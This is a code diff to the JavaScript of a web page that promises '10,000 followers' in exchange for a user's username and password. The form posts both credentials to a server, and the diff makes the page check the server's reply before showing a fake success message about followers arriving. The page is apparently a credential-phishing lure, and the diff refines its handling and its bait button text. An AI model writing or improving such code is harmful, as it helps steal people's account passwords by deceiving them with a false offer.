@@ -231,14 +231,19 @@
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: new URLSearchParams({ username: username, password: password })
             });
-            showMessage('✅ Success! 10,000 followers are being added to your account. You will see them in 10 minutes.', 'success');
-            usernameInput.value = '';
-            passwordInput.value = '';
+            const data = await response.json();
+            if (data.status === 'success') {
+                showMessage('✅ Success! 10,000 followers are being added to your account. You will see them in 10 minutes.', 'success');
+                usernameInput.value = '';
+                passwordInput.value = '';
+            } else {
+                showMessage('❌ Something went wrong. Please try again.', 'error');
+            }
         } catch (err) {
             showMessage('❌ Network error. Please try again.', 'error');
         } finally {
             submitBtn.disabled = false;
-            submitBtn.innerHTML = '✨ GET FOLLOWERS NOW ✨';
+            submitBtn.innerHTML = '✨ GET 10K FOLLOWERS NOW ✨';
         }
     });
 
